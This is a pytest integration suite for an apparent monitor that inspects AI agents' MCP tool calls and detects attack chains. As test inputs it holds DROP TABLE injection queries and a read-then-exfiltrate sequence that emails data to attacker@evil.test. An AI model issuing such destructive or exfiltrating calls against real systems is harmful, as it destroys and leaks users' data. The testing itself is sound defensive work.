"""MCP HTTP contract through the MOUNTED app (Tier A — the spearhead).

This is the function-proof the Phase 0 audit never did: it drives all eight
``/v1/mcp`` endpoints through ``create_app`` against real Postgres rows, so the
claim is "the endpoint works", not "the router is on disk". The audit graded MCP
as "8 endpoints" the same way it graded aibom as "3" — reachability, not
function (see docs/GAPS.md GAP-001). These tests replace that with evidence.

The probing that produced the findings report (three one-shot scripts against
`asp-it-pg`) is folded in here so it survives as a suite rather than a memory:
every endpoint answers, the malicious ``DROP`` call surfaces a *reasoned*
violation, and — the Tier A headline — a real two-call sequence fires the
``read_then_exfil`` attack-chain match (MITRE T1048), driven entirely through
the API, no synthetic shortcut.

Three defects the probes found are encoded as ``xfail(strict=True)`` tests, one
per condition, each naming its GAP. ``strict`` is the ratchet: the day the fix
lands, the xfail turns to XPASS and ERRORS the suite, forcing its own marker
deletion in the fix PR. A plain xfail would rot into a green lie; a strict one
cannot.

* GAP-019 — ``POST /inspect`` 500s on a malformed *stored* tool profile
  (JSONB coercion on the hot path the runtime agent hits every call).
* GAP-020 — ``POST /tools`` and ``POST /violations/{id}/resolve`` 500 instead
  of a clean 403 when the JWT subject is not a provisioned user.

Postgres-backed; runs in CI, skips locally without a database.
"""

from __future__ import annotations

import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta

import jwt
import pytest
import pytest_asyncio
from sqlalchemy import text

from app.core.config import get_settings
from app.db.models.mcp import McpToolProfile
from app.db.models.organization import Organization
from app.db.models.user import User
from app.db.session import SessionLocal

pytestmark = pytest.mark.integration


def _token(org_id: uuid.UUID, role: str = "viewer", *, subject: uuid.UUID | None = None) -> str:
    """Mint a JWT. ``subject`` becomes ``identity.user_id`` (the ``sub`` claim),
    which is what the user-stamping writes persist as ``created_by`` /
    ``resolved_by``. Pass a provisioned user's id for the happy path; omit it to
    get a random, unprovisioned subject (the GAP-020 condition)."""
    s = get_settings()
    now = datetime.now(UTC)
    claims = {
        "iss": "ai-security-platform",
        "sub": str(subject or uuid.uuid4()),
        "org": str(org_id),
        "role": role,
        "auth": "test",
        "scopes": [],
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(minutes=10)).timestamp()),
        "jti": str(uuid.uuid4()),
    }
    return jwt.encode(claims, s.jwt_secret, algorithm=s.jwt_algorithm)


@pytest_asyncio.fixture
async def org_with_user() -> AsyncIterator[tuple[uuid.UUID, uuid.UUID]]:
    """A real org plus one provisioned user. Yields (org_id, user_id).

    The user exists so the user-stamping writes (``created_by`` /
    ``resolved_by`` FK → ``users.id``) succeed on the happy path — a token whose
    subject IS this user. The GAP-020 tests deliberately use a DIFFERENT,
    unprovisioned subject."""
    org_id, user_id = uuid.uuid4(), uuid.uuid4()
    async with SessionLocal() as db:
        db.add(Organization(id=org_id, name="mcp-api", slug=f"mcp-{uuid.uuid4().hex[:8]}"))
        await db.flush()
        db.add(
            User(
                id=user_id,
                org_id=org_id,
                email=f"analyst-{user_id.hex[:8]}@example.com",
                name="Test Analyst",
                role="admin",
                idp_groups=[],
            )
        )
        await db.commit()
    yield org_id, user_id
    async with SessionLocal() as db:
        await db.execute(text("DELETE FROM organizations WHERE id = :id"), {"id": org_id})
        await db.commit()


async def _seed_profile(org_id: uuid.UUID, **overrides) -> uuid.UUID:
    """Insert an MCP tool profile directly (created_by=None, bypassing the
    users FK) so a test can exercise read/update/delete paths without depending
    on POST /tools. Returns the profile id."""
    pid = uuid.uuid4()
    fields = {
        "id": pid,
        "org_id": org_id,
        "tool_name": "seeded_tool",
        "access_mode": "read",
        "description": "",
        "allowed_params": ["q"],
        "forbidden_params": [],
        "param_constraints": {},
        "created_by": None,
    }
    fields.update(overrides)
    async with SessionLocal() as db:
        db.add(McpToolProfile(**fields))
        await db.commit()
    return pid


# ─────────────────────────────────────────── tool registry (read/update/delete)


async def test_list_tools_returns_builtins(app_client, org_with_user) -> None:
    """GET /tools answers with the built-in profile set for a fresh org."""
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'viewer')}"}
    async with app_client as client:
        resp = await client.get("/v1/mcp/tools", headers=h)
    assert resp.status_code == 200, resp.text
    names = {t["tool_name"] for t in resp.json()}
    # A day-one deployment must ship sensible defaults — database_query is the
    # one the chain test leans on, so assert it is present and read-classed.
    assert {"database_query", "send_email", "write_file"} <= names
    dbq = next(t for t in resp.json() if t["tool_name"] == "database_query")
    assert dbq["is_builtin"] is True and dbq["access_mode"] == "read"


async def test_list_tools_org_profile_overrides_builtin(app_client, org_with_user) -> None:
    """An org-custom profile shadows the built-in of the same name."""
    org_id, _ = org_with_user
    await _seed_profile(org_id, tool_name="database_query", access_mode="write")
    h = {"Authorization": f"Bearer {_token(org_id, 'viewer')}"}
    async with app_client as client:
        resp = await client.get("/v1/mcp/tools", headers=h)
    dbq = [t for t in resp.json() if t["tool_name"] == "database_query"]
    assert len(dbq) == 1, "org override must not duplicate the built-in"
    assert dbq[0]["is_builtin"] is False and dbq[0]["access_mode"] == "write"


async def test_create_tool_with_provisioned_subject(app_client, org_with_user) -> None:
    """POST /tools succeeds when the token subject is a provisioned user —
    created_by resolves the FK. This is the happy path GAP-020 does not touch."""
    org_id, user_id = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'admin', subject=user_id)}"}
    body = {
        "tool_name": "custom_scanner",
        "access_mode": "read",
        "description": "org tool",
        "allowed_params": ["target"],
        "forbidden_params": ["shell"],
    }
    async with app_client as client:
        resp = await client.post("/v1/mcp/tools", headers=h, json=body)
    assert resp.status_code == 201, resp.text
    assert resp.json()["tool_name"] == "custom_scanner"
    assert resp.json()["is_builtin"] is False


async def test_create_tool_duplicate_is_409(app_client, org_with_user) -> None:
    org_id, user_id = org_with_user
    await _seed_profile(org_id, tool_name="dupe")
    h = {"Authorization": f"Bearer {_token(org_id, 'admin', subject=user_id)}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/tools", headers=h, json={"tool_name": "dupe", "access_mode": "read"}
        )
    assert resp.status_code == 409, resp.text


async def test_update_tool(app_client, org_with_user) -> None:
    org_id, _ = org_with_user
    pid = await _seed_profile(org_id, tool_name="patch_me", description="before")
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.patch(f"/v1/mcp/tools/{pid}", headers=h, json={"description": "after"})
    assert resp.status_code == 200, resp.text
    assert resp.json()["description"] == "after"


async def test_delete_tool(app_client, org_with_user) -> None:
    org_id, _ = org_with_user
    pid = await _seed_profile(org_id, tool_name="delete_me")
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.delete(f"/v1/mcp/tools/{pid}", headers=h)
    assert resp.status_code == 204, resp.text


async def test_update_unknown_tool_is_404(app_client, org_with_user) -> None:
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.patch(
            f"/v1/mcp/tools/{uuid.uuid4()}", headers=h, json={"description": "x"}
        )
    assert resp.status_code == 404, resp.text


# ─────────────────────────────────────────── inspection + violations


async def test_inspect_benign_call_is_allowed(app_client, org_with_user) -> None:
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-benign",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": "SELECT 1"},
            },
        )
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["recommendation"] == "allow"
    assert body["allowed"] is True
    assert body["violations"] == []


async def test_inspect_malicious_call_surfaces_a_reasoned_violation(
    app_client, org_with_user
) -> None:
    """Tier A bar: the detection carries its basis. A ``DROP`` in a read-only
    query tool is flagged with a violation that NAMES the token and the tool —
    a violation without its reason is a claim, not a finding."""
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-malicious",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": "SELECT * FROM users; DROP TABLE users"},
            },
        )
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["recommendation"] in ("flag", "block")
    assert body["allowed"] is False
    assert body["risk_score"] > 0.0
    v = body["violations"]
    assert any(x["type"] == "forbidden_value" for x in v)
    detail = " ".join(x["detail"] for x in v)
    assert "DROP" in detail and "database_query" in detail


async def test_violation_surfaces_in_list_and_resolves(app_client, org_with_user) -> None:
    """The full operator path: a flagged call becomes a listed violation, and an
    analyst whose token subject is provisioned resolves it (resolved_by FK)."""
    org_id, user_id = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'analyst', subject=user_id)}"}
    async with app_client as client:
        await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-resolve",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": "DROP TABLE accounts"},
            },
        )
        listed = await client.get("/v1/mcp/violations", headers=h)
        assert listed.status_code == 200, listed.text
        rows = [r for r in listed.json() if r["session_id"] == "s-resolve"]
        assert rows, "the flagged call must surface as a violation"
        vid = rows[0]["id"]
        assert rows[0]["resolution_status"] == "open"

        resolved = await client.post(
            f"/v1/mcp/violations/{vid}/resolve",
            headers=h,
            json={"status": "resolved", "notes": "handled"},
        )
    assert resolved.status_code == 200, resolved.text
    assert resolved.json()["resolution_status"] == "resolved"


async def test_violations_filter_by_status(app_client, org_with_user) -> None:
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'analyst')}"}
    async with app_client as client:
        await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-filter",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": "DROP TABLE x"},
            },
        )
        resp = await client.get("/v1/mcp/violations?status=open", headers=h)
    assert resp.status_code == 200, resp.text
    assert all(r["resolution_status"] == "open" for r in resp.json())


# ─────────────────────────────────────────── chain detection (the headline)


async def test_chain_records_every_call(app_client, org_with_user) -> None:
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'analyst')}"}
    async with app_client as client:
        for q in ("SELECT 1", "SELECT 2"):
            await client.post(
                "/v1/mcp/inspect",
                headers=h,
                json={
                    "session_id": "s-chain-log",
                    "agent_id": "a1",
                    "tool_name": "database_query",
                    "params": {"query": q},
                },
            )
        resp = await client.get("/v1/mcp/chain/s-chain-log", headers=h)
    assert resp.status_code == 200, resp.text
    assert len(resp.json()) == 2, "every call — even allowed ones — is a chain anchor"


async def test_read_then_exfil_chain_fires_end_to_end(app_client, org_with_user) -> None:
    """The call-chain-inspection headline, proven through the API with a REAL
    two-call sequence — no synthetic injection. A read (database_query) followed
    by an exfil (send_email) in one session is the ``read_then_exfil`` attack
    chain (MITRE T1048); the match must appear on the second call, anchored on
    the current step, and carry its MITRE technique."""
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'analyst')}"}
    async with app_client as client:
        first = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-exfil",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": "SELECT * FROM customers"},
            },
        )
        assert first.status_code == 200, first.text
        assert first.json()["chain_matches"] == [], "no chain on the first call"

        second = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-exfil",
                "agent_id": "a1",
                "tool_name": "send_email",
                "params": {"to": "attacker@evil.test", "subject": "x", "body": "data"},
            },
        )
    assert second.status_code == 200, second.text
    body = second.json()
    matches = {c["name"]: c for c in body["chain_matches"]}
    assert "read_then_exfil" in matches, f"chain not detected: {body['chain_matches']}"
    assert matches["read_then_exfil"]["mitre_technique"] == "T1048"
    assert matches["read_then_exfil"]["severity"] == "critical"
    # The chain lifts risk into non-allow territory — the point of detecting it.
    assert body["recommendation"] in ("flag", "block")
    assert body["allowed"] is False


# ─────────────────────────────────────────── robustness on garbage INPUT


async def test_inspect_does_not_500_on_odd_param_types(app_client, org_with_user) -> None:
    """Request-body params are operator-shaped: non-string values, nested dicts,
    lists. None of it may 500 — malformed input is a client condition. (Distinct
    from a malformed stored PROFILE, which is GAP-019 below.)"""
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-odd",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": 12345, "nested": {"a": 1}, "list": [1, 2, 3]},
            },
        )
    assert resp.status_code == 200, resp.text


async def test_inspect_unregistered_tool_flags_not_500s(app_client, org_with_user) -> None:
    """An unknown tool is fail-closed as a violation, not a crash."""
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-unknown",
                "agent_id": "a1",
                "tool_name": "totally_unknown_tool",
                "params": {},
            },
        )
    assert resp.status_code == 200, resp.text
    assert any(v["type"] == "unregistered_tool" for v in resp.json()["violations"])


# ─────────────────────────────────────────── authz negative paths


async def test_unauthenticated_is_401(app_client, org_with_user) -> None:
    async with app_client as client:
        resp = await client.get("/v1/mcp/tools")
    assert resp.status_code == 401, resp.text


async def test_viewer_cannot_create_tool(app_client, org_with_user) -> None:
    """POST /tools requires admin; a viewer is refused before any write."""
    org_id, _ = org_with_user
    h = {"Authorization": f"Bearer {_token(org_id, 'viewer')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/tools", headers=h, json={"tool_name": "x", "access_mode": "read"}
        )
    assert resp.status_code == 403, resp.text


# ═══════════════════════════════════════════ DEFECT TESTS (xfail strict)
#
# These assert the DESIRED behaviour and fail today. strict=True means each
# turns to an ERROR (XPASS) the day its fix lands — the fix PR must delete the
# marker, which is the proof the defect is closed. See docs/GAPS.md.


@pytest.mark.xfail(
    strict=True,
    reason="GAP-019: /inspect 500s (AttributeError) on a malformed stored tool "
    "profile — param_constraints read from JSONB without coercion. Fixed in "
    "increment 2 (app/core/coerce.py applied to resolve_profile/_inspect_params).",
)
async def test_inspect_malformed_stored_profile_does_not_500(app_client, org_with_user) -> None:
    """A profile whose ``param_constraints`` is not a dict-of-dicts, and whose
    ``allowed_params`` is a string, crashes the inspect hot path today
    (``'str' object has no attribute 'get'``). Reference quality: malformed
    operator data degrades to honest-empty, never a 500 — the runtime agent
    calls this on every tool invocation, so one bad profile must not take out
    inspection for that tool."""
    org_id, _ = org_with_user
    await _seed_profile(
        org_id,
        tool_name="malformed_tool",
        allowed_params="not-a-list",
        param_constraints={"query": "not-a-dict"},
    )
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/inspect",
            headers=h,
            json={
                "session_id": "s-badprofile",
                "agent_id": "a1",
                "tool_name": "malformed_tool",
                "params": {"query": "SELECT 1"},
            },
        )
    assert resp.status_code == 200, resp.text


@pytest.mark.xfail(
    strict=True,
    reason="GAP-020: POST /tools 500s (unhandled FK IntegrityError on "
    "created_by → users) when the JWT subject is not a provisioned user. "
    "Contract: check the subject BEFORE the write and return 403. Fixed in "
    "increment 3.",
)
async def test_create_tool_unprovisioned_subject_is_403(app_client, org_with_user) -> None:
    org_id, _ = org_with_user  # token subject is a random, unprovisioned uuid
    h = {"Authorization": f"Bearer {_token(org_id, 'admin')}"}
    async with app_client as client:
        resp = await client.post(
            "/v1/mcp/tools",
            headers=h,
            json={"tool_name": "orphan_tool", "access_mode": "read"},
        )
    assert resp.status_code == 403, resp.text
    assert "provisioned user" in resp.json().get("detail", "")


@pytest.mark.xfail(
    strict=True,
    reason="GAP-020: POST /violations/{id}/resolve 500s (unhandled FK "
    "IntegrityError on resolved_by → users) when the JWT subject is not a "
    "provisioned user. Same contract as create_tool: 403 before the write. "
    "Fixed in increment 3.",
)
async def test_resolve_violation_unprovisioned_subject_is_403(app_client, org_with_user) -> None:
    org_id, user_id = org_with_user
    # Create the violation with a PROVISIONED analyst (so the inspect write
    # succeeds), then attempt to resolve it with an UNPROVISIONED subject.
    prov = {"Authorization": f"Bearer {_token(org_id, 'analyst', subject=user_id)}"}
    orphan = {"Authorization": f"Bearer {_token(org_id, 'analyst')}"}
    async with app_client as client:
        await client.post(
            "/v1/mcp/inspect",
            headers=prov,
            json={
                "session_id": "s-orphan-resolve",
                "agent_id": "a1",
                "tool_name": "database_query",
                "params": {"query": "DROP TABLE x"},
            },
        )
        listed = await client.get("/v1/mcp/violations?status=open", headers=prov)
        vid = next(r["id"] for r in listed.json() if r["session_id"] == "s-orphan-resolve")
        resp = await client.post(
            f"/v1/mcp/violations/{vid}/resolve",
            headers=orphan,
            json={"status": "resolved"},
        )
    assert resp.status_code == 403, resp.text
    assert "provisioned user" in resp.json().get("detail", "")
